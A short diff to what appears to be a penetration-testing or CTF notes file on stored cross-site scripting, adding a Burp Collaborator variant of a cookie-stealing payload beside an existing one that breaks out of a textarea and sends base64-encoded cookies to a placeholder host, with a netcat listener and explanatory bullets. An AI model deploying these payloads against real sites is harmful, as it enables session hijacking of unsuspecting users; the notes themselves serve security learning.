@@ -52,6 +52,16 @@ nc -lvnp <port>
 ```javascript
 </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
 ```
+***Using Burp Collaborator:***
+```javascript
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 - The </textarea> tag closes the text area field.
 - The <script> tag opens an area for us to write JavaScript.
 - The fetch() command makes an HTTP request.
